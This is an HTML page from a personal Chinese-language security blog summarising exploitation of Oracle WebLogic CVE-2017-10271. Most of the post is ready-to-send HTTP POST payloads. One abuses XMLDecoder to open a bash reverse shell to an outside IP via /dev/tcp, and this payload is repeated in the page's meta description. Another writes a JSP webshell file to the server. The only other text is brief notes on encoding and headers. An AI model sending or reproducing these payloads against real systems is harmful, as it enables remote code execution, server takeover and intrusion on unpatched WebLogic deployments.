<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Weblogic 总结 - rab3it</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta property="og:title" content="Weblogic 总结" />
<meta property="og:description" content="weblogic 漏洞总结 CVE-2017-10271 发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：
POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: your-ip:7001 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: text/xml Content-Length: 633 &lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt; &lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt; &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt; &lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt; &lt;void index=&#34;0&#34;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;1&#34;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;2&#34;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.8.140/21 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&#34;start&#34;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 其中需要注意的是 1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://rab3it.github.io/post/weblogic-summary/" />
<meta property="article:published_time" content="2019-12-23T23:37:48+08:00" />
<meta property="article:modified_time" content="2019-12-23T23:37:48+08:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Weblogic 总结"/>
<meta name="twitter:description" content="weblogic 漏洞总结 CVE-2017-10271 发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：
POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: your-ip:7001 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: text/xml Content-Length: 633 &lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt; &lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt; &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt; &lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt; &lt;void index=&#34;0&#34;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;1&#34;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;2&#34;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.8.140/21 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&#34;start&#34;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 其中需要注意的是 1."/>
<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">

	<link rel="stylesheet" type="text/css" media="screen" href="https://rab3it.github.io/css/normalize.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="https://rab3it.github.io/css/main.css" /><link rel="stylesheet" type="text/css" href="https://rab3it.github.io/css/dark.css" media="(prefers-color-scheme: dark)" />

	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
	<script src="https://rab3it.github.io/js/main.js"></script>
</head>

<body>
	<div class="container wrapper post">
		<div class="header">
	<h1 class="site-title"><a href="https://rab3it.github.io/">rab3it</a></h1>
	<div class="site-description"><h2></h2><nav class="nav social">
			<ul class="flat"><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
		</nav>
	</div>

	<nav class="nav">
		<ul class="flat">
			
			<li>
				<a href="/">Home</a>
			</li>
			
			<li>
				<a href="/post">All posts</a>
			</li>
			
			<li>
				<a href="/about">About</a>
			</li>
			
			<li>
				<a href="/tags">Tags</a>
			</li>
			
		</ul>
	</nav>
</div>


		<div class="post-header">
			<h1 class="title">Weblogic 总结</h1>
			<div class="meta">Posted at &mdash; Dec 23, 2019</div>
		</div>

		<div class="markdown">
			<h3 id="weblogic-">weblogic 漏洞总结</h3>
<h4 id="cve-2017-10271">CVE-2017-10271</h4>
<p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p>
<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

&lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt;
&lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt;
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;
&lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;
&lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt;
&lt;void index=&#34;0&#34;&gt;
&lt;string&gt;/bin/bash&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&#34;1&#34;&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&#34;2&#34;&gt;
&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.8.140/21 0&amp;gt;&amp;amp;1&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method=&#34;start&#34;/&gt;&lt;/void&gt;
&lt;/java&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div><div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">其中需要注意的是
1.需要以POST格式提交
2.请求头中必须要带上Content-Type: text/xml，否则可能会报415错误，以下表示已经成功
3.html编码:&#39;&gt;&amp;&#39;=&gt;&#39;&amp;gt;&amp;amp;&#39;
</code></pre></div><p><img src="https://github.com/rab3it/rab3it.github.io/blob/master/images/web-01.png" alt="web-01"></p>
<p>写入webshell（访问：http://192.168.8.139:7001/bea_wls_internal/test.jsp）：</p>
<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

&lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt;
    &lt;soapenv:Header&gt;
    &lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt;
    &lt;java&gt;&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;
    &lt;object class=&#34;java.io.PrintWriter&#34;&gt; 
    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
    &lt;void method=&#34;println&#34;&gt;&lt;string&gt;
    &lt;![CDATA[
&lt;% out.print(&#34;test&#34;); %&gt;
    ]]&gt;
    &lt;/string&gt;
    &lt;/void&gt;
    &lt;void method=&#34;close&#34;/&gt;
    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
    &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div><div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;![CDATA[]]&gt;的作用是防止被解析；
XML文档中的所有文本均会被解析器解析，只有 CDATA 区段中的文本会被解析器忽略。
</code></pre></div><p><img src="https://github.com/rab3it/rab3it.github.io/blob/master/images/web-02.png" alt="web-01"></p>

		</div>

		<div class="post-tags">
			
				
			
		</div></div>
	<div class="footer wrapper">
	<nav class="nav">
		<div>
			 
			
			
	</nav>
</div>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-123-45', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
<script>feather.replace()</script>
</body>
</html>
